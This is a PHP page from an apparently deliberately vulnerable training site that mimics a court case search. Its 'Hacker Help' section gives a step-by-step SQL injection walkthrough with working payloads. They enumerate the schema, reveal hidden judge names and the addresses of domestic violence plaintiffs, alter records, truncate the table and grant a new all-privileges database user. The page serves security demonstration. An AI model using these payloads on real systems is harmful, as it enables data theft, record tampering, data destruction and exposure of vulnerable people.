<?php
require('../resources/header.html');
?>
<div class='container'>
  <div class="row text-center">
    <div class="col-lg-8 mx-auto">
      <h1 class='text-primary'>Case Search</h1>
      <br>
      <p>This page mimics a Court's case search website.</p>
    </div>
  </div>
</div>
<div class="container">
      <div class="row">
        <div class="col-lg-8 mx-auto">
          <div class="form-group">
            <h2> Search by Case Number </h2>
            <form method = "GET" action="casepage.php">
              <label for "casenumber">Case Number:</label><br>
              <input id="casenumber" type="text" name="casenumber" class="form-control">
              <small id="emailHelp" class="form-text text-muted">Try 12C934912 if you need a case number.</small>
              <br><br>
              <button type="submit" class="btn btn-primary">Search</button>
            </form>
          </div>
          <br>
          <hr>
          <div class="form-group">
            <h2> Search by Last Name </h2>
          <form method = "GET" action="caseresults.php">
          <label for "lastname">Last Name:</label><br>
            <input type="text" id="lastname" class="form-control" name="lastname">
            <br>
            <label for "limit">Result Limit:</label><br>
              <select name="limit" id="limit" class="form-control">
                <option value = "5">5</option>
                <option value = "10">10</option>
              </select>
              <br>
            <button type="submit" class="btn btn-primary">Search</button>
          </form> 
          </div>
        </div>
      </div>
    </div>'
    <div class='container'>
  <div class="row text-left">
    <div class="col-lg-12 mx-auto">
        <hr>
      
      <button class='btn btn-primary' data-toggle="collapse" data-target="#hackerhelp">Click For Hacker Help</button>
      <div id="hackerhelp" class="collapse">
        </br>
        <p class='text-primary font-weight-bold'>SQL Injection Queries</p>
        <p>Type this into the case number search box. It can also be typed into the url as a get parameter.</p>

        <p class='text-primary'>Step 1: Find the custom schema and return as the case number by continually adding 'test' as test until the columns match up.</p>
          <p>fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(schema_name)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.schemata WHERE '1'='1</p>

          <p class='text-primary'> Step 2: Get all the table names from that custom schema.</p>
          <p>fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(TABLE_NAME)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.TABLES WHERE table_schema ='websitedata</p>

          <p class='text-primary'>Step 3: Get all the column names from that table.</p>
          <p>fakecasenumber' UNION ALL SELECT GROUP_CONCAT(concat(COLUMN_NAME)separator ';'),'test','test','test','test','test','test','test','test' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='casedata</p>

          <p class='text-primary'>Step 4: Now that we have all the column names for case data we can return different items. We notice the number of columns is also the number needed for the select statement so we assume they are using an *.
          We also notice a column that is not displayed anywhere called "Judge". We can replace case description with Judge to print out who the Judge will be.</p>
          <p>fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Judge:", Judge) as Case_Description,'test' From casedata WHERE Case_Number = '12C934902</p>

          <p class='text-primary'>Step 5: We notice on domestic violence cases the plaintiff addres isn't shown. Using the same trick as before we can show the plaintiff address as case description</p>
          <p>fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Plaintiffs Address: ",Plaintiff_Address) as Case_Description,Judge From casedata WHERE Case_Number = '12C934902</p>

          <p class='text-primary'>Step 6: We test to see if it will let us run multiple queries. If the permissions aren't set right we can update or delte out information.</p>
          <p>fakecasenumber'; UPDATE casedata SET Hearing_Date = '10/25/2019' WHERE Case_Number = '12C934910</p>

          <p class='text-primary'>Step 7: We can update the defendants name to something else</p>
          <p>fakecasenumber'; UPDATE casedata SET Defendant_Name = 'John Smith' WHERE Case_Number = '12C934910</p>

          <p class='text-primary'>Step 8: We can wipe out all the data using truncate.</p>
          <p class='text-danger font-weight-bold'>Please don't do during a live demo!</p>
          <p>fakecasenumber'; TRUNCATE casedata; SELECT * FROM casedata WHERE Case_Number = '12C9349010</p>

          <p class='text-primary'>Step 9: Finally we can create a new user so we can simply login ourselves to more directly control the mysql server.</p>
          <p>fakecasenumber'; GRANT ALL PRIVILEGES ON *.* TO 'hackerman'@'localhost' IDENTIFIED BY 'password</p>
      </div>
      </br>
      </br>
    </div>
  </div>
</div>
<?php
require('../resources/footer.html');
?>